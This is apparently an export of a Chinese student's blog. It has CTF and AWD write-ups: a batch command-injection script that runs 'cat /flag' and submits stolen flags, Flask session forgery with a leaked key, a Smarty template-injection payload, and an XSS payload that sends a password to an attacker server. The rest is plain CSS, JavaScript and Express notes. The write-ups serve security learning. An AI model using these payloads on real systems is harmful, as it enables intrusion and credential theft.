<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>在拿到网站的时候第一件事情就是改密码，由于我们这次是随机密码，被其他队猜到的可能性不大，所以就没有改，直接拖下源码，d盾扫一句话，进攻其他队，同时防御。我和我队友配合的比较好，他手提flag，我找洞修洞</p>
<h2 id="转折"><a href="#转折" class="headerlink" title="转折"></a>转折</h2><p>后来学长也加进来了，我们的站就经常被删，这时候的心态就有点小炸，因为洞是在靶机上修的，每次把源码拖上去的时候就还是带漏洞，就搞不清楚那些洞修了哪些没修，没想到在本地先修在上传，最后就寄了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在优势的情况下，没有继续挖洞，修洞保持优势。删站的时候动作幅度太大，把整个文件夹都删了，容易被被删站的人发现。没有上流量监控脚本，看其他人打我们的exp从而进行反击</p>
<p>附上批量脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot; http://172.17.135.39:&#123;&#125;/App/Api/nothing.php?a=system(&#x27;cat /flag&#x27;);&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">8001</span>,<span class="number">8010</span>):</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">     url2=url.<span class="built_in">format</span>(i)</span><br><span class="line">     <span class="comment"># playload=&#123;&quot;a&quot;:&quot;system(&#x27;cat /flag&#x27;)&quot;&#125;</span></span><br><span class="line">     g=requests.get(url=url2)</span><br><span class="line">     flag=g.text</span><br><span class="line">     <span class="built_in">print</span>(flag)</span><br><span class="line">     url3=<span class="string">&#x27;http://172.17.135.26:19999/#/&#x27;</span></span><br><span class="line">     header=&#123;<span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;b67f4335dd35fc53718d46bef5be9361&#x27;</span>,<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">     flag=&#123;<span class="string">&#x27;flag&#x27;</span>:flag&#125;</span><br><span class="line">     y=requests.post(url=url3,headers=header,json=flag)</span><br><span class="line">     <span class="built_in">print</span>(y.text)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;no flag&#x27;</span>)</span><br></pre></td></tr></table></figure>





]]></content>
      <tags>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask Message Board</title>
    <url>/2021/11/25/web4-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="刷题记录"><a href="#刷题记录" class="headerlink" title="刷题记录"></a>刷题记录</h1><p>题目说了是flask框架那就是ssti</p>
<p>![](屏幕截图 2021-11-25 121236.png)</p>
<p>可以在title，author，content中尝试</p>
<p>![](屏幕截图 2021-11-25 122120.png)</p>
<p>发现注入点在author</p>
<p>尝试ssti</p>
<p>![](屏幕截图 2021-11-25 122247.png)</p>
<p>![](web4-1/屏幕截图 2021-11-25 122431.png)</p>
<p>报错</p>
<p>看到下面</p>
<p>![](屏幕截图 2021-11-25 122602.png)</p>
<p>有个过滤模型,所以想在author处ssti就很难，但是天无绝人之路，在最底下发现了admin页面,进入页面发现自己不是admin用户，而且识别是否为admin是用session进行的</p>
<p>![](屏幕截图 2021-11-25 123107.png)</p>
<p>flask有自己的一套session的生成方法,需要一个密钥来生成，我们伪造session也需要密钥，看看密钥在不在配置文件里</p>
<p>![](屏幕截图 2021-11-25 163440.png)</p>
<p>找到了密钥</p>
<p>接下来写我们的伪造session脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> re,sys</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line">secretkey=<span class="string">&#x27;||li1|l|llliIl1Ii1Ii|1I|I|I|iI11|I|1i|I|&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.secret_key=<span class="literal">None</span></span><br><span class="line">app=App()</span><br><span class="line">app.secret_key=secretkey</span><br><span class="line">s=SecureCookieSessionInterface()</span><br><span class="line">se=s.get_signing_serializer(app)</span><br><span class="line">session=se.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>:<span class="string">&#x27;true&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p>![](屏幕截图 2021-11-25 165257.png)</p>
<p>将cookie中的session换成该值</p>
<p>访问成功</p>
<p>![](屏幕截图 2021-11-25 165710.png)</p>
<p>看到有上传文件的功能，试下能不能文件上传</p>
<p>![](屏幕截图 2021-11-25 170143.png)</p>
<p>但是没有回显，不知道有没有上传成功，就算上传成功了也不知道文件的位置</p>
<p>查看网页源码</p>
<p>![](屏幕截图 2021-11-25 170558.png)</p>
<p>![](屏幕截图 2021-11-25 170635.png)</p>
<p>访问给出的路由得到源码和模型</p>
<p>![](屏幕截图 2021-11-25 171050.png)</p>
<p>实在是看不懂了去找了官方wp</p>
<p>因为这样那样，在connet输入1024个字节就能拿到flag</p>
]]></content>
  </entry>
  <entry>
    <title>css</title>
    <url>/2021/11/29/css/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="层叠与继承"><a href="#层叠与继承" class="headerlink" title="层叠与继承"></a>层叠与继承</h1><h2 id="冲突规则"><a href="#冲突规则" class="headerlink" title="冲突规则"></a>冲突规则</h2><p>在css中对一相同元素的样式的规则会写在最后的会覆盖前面的规则。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: blue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>wsnd<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>上代码的渲染结果是蓝色，因为蓝色在后面，把前面的红色覆盖了</p>
<p>如果有更精准的定位，就会用有精准定位的规则</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hui</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: blue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;hui&quot;</span>&gt;</span>wsnd<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果是红色</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>在父类的属性会被子类继承</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>df<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>sd<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>df和sd都为红色</p>
<p>但不是去全部的属性都能被继承</p>
<h3 id="控制继承"><a href="#控制继承" class="headerlink" title="控制继承"></a>控制继承</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/inherit"><code>inherit</code></a></p>
<p>设置该属性会使子元素属性和父元素相同。实际上，就是 “开启继承”.</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/initial"><code>initial</code></a></p>
<p>设置属性值和浏览器默认样式相同。如果浏览器默认样式中未设置且该属性是自然继承的，那么会设置为 <code>inherit</code> 。</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/unset"><code>unset</code></a></p>
<p>将属性重置为自然值，也就是如果属性是自然继承那么就是 <code>inherit</code>，否则和 <code>initial</code>一样</p>
<p>用上面的值来控制是否继承</p>
<h2 id="层叠规则"><a href="#层叠规则" class="headerlink" title="层叠规则"></a>层叠规则</h2><p>有3个因素</p>
<ol>
<li>重要程度</li>
<li>优先级</li>
<li>资源顺序</li>
</ol>
<p>现在让我们来看看浏览器如何计算优先级。我们已经知道一个元素选择器比类选择器的优先级更低会被其覆盖。本质上，不同类型的选择器有不同的分数值，把这些分数相加就得到特定选择器的权重，然后就可以进行匹配。</p>
<p>一个选择器的优先级可以说是由四个部分相加 (分量)，可以认为是个十百千 — 四位数的四个位数：</p>
<ol>
<li><strong>千位</strong>： 如果声明在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes#attr-style"><code>style</code></a> 的属性（内联样式）则该位得一分。这样的声明没有选择器，所以它得分总是1000。</li>
<li><strong>百位</strong>： 选择器中包含ID选择器则该位得一分。</li>
<li><strong>十位</strong>： 选择器中包含类选择器、属性选择器或者伪类则该位得一分。</li>
<li><strong>个位</strong>：选择器中包含元素、伪元素选择器则该位得一分。</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>js基本函数</title>
    <url>/2021/12/02/js/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="document-querySelector"><a href="#document-querySelector" class="headerlink" title="document.querySelector()"></a>document.querySelector()</h1><p>该方法为dom的内置方法，用于将html中的元素储存到一个变量中，让html和js产生联系，该变量有该标签的属性，用变量名加.加属性名来访问。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> html=docment.queruSelector(<span class="string">&#x27;html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>上述代码就是把html中的html标签存放在常量html中</p>
<h1 id="document-createElement"><a href="#document-createElement" class="headerlink" title="document.createElement()"></a>document.createElement()</h1><p>该方法也是dom方法，用于创建一个新元素并放在储存在一个变量中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> div=<span class="built_in">document</span>.creatElement(<span class="string">&#x27;div&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>上述代码创建了div元素并放在常量div中</p>
<h1 id="document-setAttribute"><a href="#document-setAttribute" class="headerlink" title="document.setAttribute()"></a>document.setAttribute()</h1><p>该方法用来给js创建的元素添加属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.setAttribute(<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>上述代码就给div添加了class为ff</p>
<h1 id="appendChild"><a href="#appendChild" class="headerlink" title="appendChild"></a>appendChild</h1><p>给一个元素添加子元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">html.appendChild(div)</span><br></pre></td></tr></table></figure>

<p>给html元素中添加了div元素</p>
<h1 id="removeChlid"><a href="#removeChlid" class="headerlink" title="removeChlid"></a>removeChlid</h1><p>用于移除子元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">html.remove(div)</span><br></pre></td></tr></table></figure>

<p>上述代码就移除了html的div元素</p>
]]></content>
  </entry>
  <entry>
    <title>js_object</title>
    <url>/2021/12/02/object/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="对象定义"><a href="#对象定义" class="headerlink" title="对象定义"></a>对象定义</h1><p>在js中用{}来定义一个对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hh=&#123;</span><br><span class="line">    <span class="attr">age</span>:<span class="string">&#x27;dd&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="访问对象成员"><a href="#访问对象成员" class="headerlink" title="访问对象成员"></a>访问对象成员</h2><p>age是值的名，在：后加值，与python中的字典相似，访问age要用对象名加.加要访问的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hh.age</span><br></pre></td></tr></table></figure>

<p>该表示方法叫点表示法</p>
<p>还有一种表示法叫括号表示法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hh[<span class="string">&#x27;age&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h2 id="设置对象成员"><a href="#设置对象成员" class="headerlink" title="设置对象成员"></a>设置对象成员</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hh.age=<span class="number">45</span></span><br></pre></td></tr></table></figure>

<p>把age的值设置成了45</p>
<p>还可以添加成员</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hh[&#x27;name&#x27;]=&#x27;ming&#x27;</span><br></pre></td></tr></table></figure>

<p>添加了一个新成员name值为ming</p>
<h2 id="this变量"><a href="#this变量" class="headerlink" title="this变量"></a>this变量</h2><p>与php中的this变量差不多，用与指代对象本身</p>
<h2 id="对象函数"><a href="#对象函数" class="headerlink" title="对象函数"></a>对象函数</h2><p>与普通函数定义没什么区别，但是为了区分对象函数与普通函数，对象函数名第一个字母大写</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">We</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name=<span class="string">&#x27;ming&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> h=<span class="keyword">new</span> We();</span><br><span class="line">h.name</span><br></pre></td></tr></table></figure>

<p>实列化对象也与php中类的实例化相似，用new来实例化。</p>
<h2 id="create"><a href="#create" class="headerlink" title="create()"></a>create()</h2><p>create函数可以基于现有对象中创建对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> hhh=<span class="built_in">Object</span>.create(h);</span><br></pre></td></tr></table></figure>



<h1 id="对象继承"><a href="#对象继承" class="headerlink" title="对象继承"></a>对象继承</h1><p>每一个函数都有一个原型，js是一门基于原型的语言</p>
<p>可以用函数名加prototype来访问到原型，</p>
<p>还可以在原型中添加函数，每个从该原型中衍生的函数都能访问到该方法</p>
<p>在一个构造函数中继承其他构造函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.x=x</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    a.call(<span class="built_in">this</span>,x)</span><br><span class="line">    <span class="built_in">this</span>.y=y</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="json"><a href="#json" class="headerlink" title="json"></a>json</h1><p>与php中的序列化差不多。</p>
]]></content>
  </entry>
  <entry>
    <title>odd_upload</title>
    <url>/2021/12/11/odd-upload/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="odd-upload"><a href="#odd-upload" class="headerlink" title="odd_upload"></a>odd_upload</h1><p><img src="https://s2.loli.net/2021/12/11/vWMlJdckbo9weL6.png"></p>
<p>题目提示与官方目录的examle相同</p>
<p>点进题目</p>
<p><img src="https://s2.loli.net/2021/12/11/5PqabH79Tj8OshA.png"></p>
<p>看到是smarty框架</p>
<p><img src="https://s2.loli.net/2021/12/11/mPQMe5jkr71lqYT.png"></p>
<p>有个文件上传功能，我们第一时间想到文件上传漏洞上传个一句话木马，但是这道题的过滤很死更本传不上去，看到保存路径可以我们自行更改，加上前面的提示，我们去翻看smarty的官方文档</p>
<p><img src="https://s2.loli.net/2021/12/11/fDcopS1XZUn9rEC.png"></p>
<p>在template目录下有个渲染模板index.tpl</p>
<p>这个文件是用来渲染主页的index.php</p>
<p>这样思路就有了，我们可以上传一个自己的index.tpl。去覆盖原来的index.tpl，从而拿到flag</p>
<h1 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h1><p>在原来tpl的后面加</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;</span><br><span class="line">	&#123;<span class="keyword">eval</span> <span class="keyword">var</span>=system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;</span><br><span class="line">&lt;/p&gt;  </span><br></pre></td></tr></table></figure>

<p>就行了然后上传刷新</p>
<p><img src="https://s2.loli.net/2021/12/11/jQSJ8l1PfaH9Wg7.png"></p>
<p>拿到flag</p>
]]></content>
  </entry>
  <entry>
    <title>xss</title>
    <url>/2021/12/16/xss/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>xss漏洞，对用户输入的数据完全信任，导致再html中插入恶意的js代码，使用户的 导致用户的信息泄露。</p>
<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>构造恶意的前端代码，将用户信息带出</p>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]<strong>mypassword</strong></h2><p><img src="https://s2.loli.net/2021/12/16/9Gn62p8A1RoQqVZ.png"></p>
<p>先注册登入</p>
<p><img src="https://s2.loli.net/2021/12/16/C5shYAzZinTR42P.png"></p>
<p>提示密码在源码里，而且不能注入，猜测flag就是密码。</p>
<p><img src="https://s2.loli.net/2021/12/16/URDP2JpOryI8qds.png"></p>
<p>反馈界面可以用户提交，</p>
<p><img src="https://s2.loli.net/2021/12/16/FUiz4IfoC7NmvEX.png"></p>
<p>先提交个1试一下</p>
<p><img src="https://s2.loli.net/2021/12/16/km56s2YRBFTKOCt.png"></p>
<p>可以看到1被写入的前端代码中</p>
<p>在这里就可以使用xss写入恶意的前端代码</p>
<p><img src="https://s2.loli.net/2021/12/16/pWfK34vBPEuOmkz.png"></p>
<p>先用alert测试一下</p>
<p><img src="https://s2.loli.net/2021/12/16/axf5COU2qIpLbcW.png"></p>
<p>看来是有过滤</p>
<p>看下源码</p>
<p><img src="https://s2.loli.net/2021/12/16/QhvcANaLIoFHBp6.png"></p>
<p>过滤的还蛮多，用scrcookieipt绕过过滤</p>
<p><img src="https://s2.loli.net/2021/12/16/vmgNKTQy5FOt6qo.png"></p>
<p><img src="https://s2.loli.net/2021/12/16/rA1n5uC2W4qGYyg.png"></p>
<p>成功了</p>
<p>接下来就是想怎么把password带出来</p>
<p>在login界面有login.js</p>
<p><img src="https://s2.loli.net/2021/12/16/nIfbuE9GLqwl5tO.png"></p>
<p>把cookie中的password写到了html的password元素中</p>
<p>所以构造</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;username&#x27;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">typr</span>=<span class="string">&#x27;password&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;password&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> h=<span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;password&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> j=<span class="string">&#x27;your vps&#x27;</span>+h;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">ducument.location=j;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2021/12/16/bgPenGpfO3tNlRi.png"></p>
<p><img src="https://s2.loli.net/2021/12/16/Lycal67r9YH3opR.png"></p>
<p><img src="https://s2.loli.net/2021/12/16/EbFoc3NOiITAZfY.png"></p>
<p>得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>express笔记</title>
    <url>/2022/01/07/express/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>express是基于node.js的web开发框架</p>
<h1 id="基本应用"><a href="#基本应用" class="headerlink" title="基本应用"></a>基本应用</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()<span class="comment">//建立一个express应用</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span> <span class="comment">//路由, (req, res) =&gt; &#123;</span></span><br><span class="line">  res.send(<span class="string">&#x27;Hello World!&#x27;</span>)</span><br><span class="line">&#125;)<span class="comment">//app.get()接受两个参数，第一个是路由路径，第二个是处理请求的匿名函数，有两个形参，第一个代表请求，第二个代表相应</span></span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)<span class="comment">//监听端口</span></span><br></pre></td></tr></table></figure>

<p>express不仅支持</p>
<h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>中间件是对一次请求进行多次有次序的处理，打个比方我们要验证前端发来的数据，然后通过后发送登入成功，就可以用两个方法，一个验证前端数据，一个发送数据，因为验证是在发送数据前面，就要用到中间件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"> <span class="keyword">var</span> app = express();</span><br><span class="line"> app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// req 修改请求</span></span><br><span class="line">    <span class="comment">// res 响应对象</span></span><br><span class="line">     checkres<span class="comment">//验证数据</span></span><br><span class="line">    next(); <span class="comment">// 当前中间件函数没有结束请求/响应循环， 调用next(), </span></span><br><span class="line">           <span class="comment">// 将控制权传递给下一个中间件函数继续往下处理，否则页面到此会被挂起</span></span><br><span class="line"> &#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/end&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&#x27;程序到我这里就结束了，没有next方法&#x27;</span>);<span class="comment">//发送数据</span></span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<p>使用next()就会调用下一个中间件</p>
<p>中间件还有种使用方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"> <span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span>  next= <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// req 修改请求</span></span><br><span class="line">    <span class="comment">// res 响应对象</span></span><br><span class="line">    next(); <span class="comment">// 当前中间件函数没有结束请求/响应循环， 调用next(), </span></span><br><span class="line">           <span class="comment">// 将控制权传递给下一个中间件函数继续往下处理，否则页面到此会被挂起</span></span><br><span class="line"> &#125;</span><br><span class="line">app.use(next)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/end&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&#x27;程序到我这里就结束了，没有next方法&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<h1 id="api"><a href="#api" class="headerlink" title="api"></a>api</h1><p>太多了，不记了直接去官网看</p>
]]></content>
  </entry>
  <entry>
    <title>proto</title>
    <url>/2022/01/15/proto/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h1><p>js中一切都是对象，js的对象是函数定义的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>（）</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar=<span class="number">1</span></span><br><span class="line">&#125;<span class="comment">//创建了一个a函数，也可以说是a类的构造函数</span></span><br><span class="line"><span class="keyword">var</span> q=<span class="keyword">new</span> a();<span class="comment">//从a类中创建一个q实例</span></span><br><span class="line">q.construtor<span class="comment">//可以查看当前类的构造函数</span></span><br></pre></td></tr></table></figure>

<p>__proto__和prototype</p>
<p>prototype是类的一个基本属性，类会继承prototype的属性和方法，对象的__proto__和类的prototype属性是一样的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.prototype=q.__proto__</span><br></pre></td></tr></table></figure>

<p>原型链继承</p>
<p>在js中查找对象的属性时如果该属性在该对象中不存在就回向上查找该对象的原型中有没有，如果没有还会继续向上查找原型的原型，直到为null为止</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">b.prtotype.name=<span class="string">&quot;ming&quot;</span></span><br><span class="line"><span class="keyword">var</span> j=b()</span><br><span class="line"><span class="built_in">console</span>.log(j.name)</span><br><span class="line"><span class="comment">//ming</span></span><br></pre></td></tr></table></figure>

<p>原型链污染</p>
<p>对象的原型是object类，修改一个对象的object属性，就可以影响到另一个从object中创建出来的对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> h=&#123;<span class="attr">bar</span>:<span class="number">1</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(h.bar)</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line">h.__proto__.bar=<span class="number">2</span></span><br><span class="line"><span class="built_in">console</span>(h.bar)</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="keyword">let</span> g=&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(g.bar)</span><br><span class="line"><span class="comment">//2</span></span><br></pre></td></tr></table></figure>

<p>在应用中攻击者控制修改了一个对象的原型，就可以影响所有由改原型创建的对象</p>
<p>这就是原型链污染</p>
<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>有用户可控的对象，就可以用进行原型链污染的漏洞</p>
<p>敏感函数</p>
<p>merge，将两个对象合并成一个对象</p>
<p>clone，克隆一个对象</p>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p><img src="https://s2.loli.net/2022/01/16/gOMAWPT4DoRyjHl.png"></p>
<p>先扫目录发现<a href="http://www.zip/">www.zip</a></p>
<p>下到源码</p>
<p>题目提示用admin登录，但是源码中把admin过滤了</p>
<p><img src="https://s2.loli.net/2022/01/16/ahTvYScE6zPfir1.png"></p>
<p>但是在login的路由里用来toUpperCase</p>
<p><img src="https://s2.loli.net/2022/01/16/JPifeQU2rl3W7km.png"></p>
<p>利用js中toUpperCase的特性</p>
<p>参考p牛的文章<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<p>用admın注册</p>
<p>继续审代码</p>
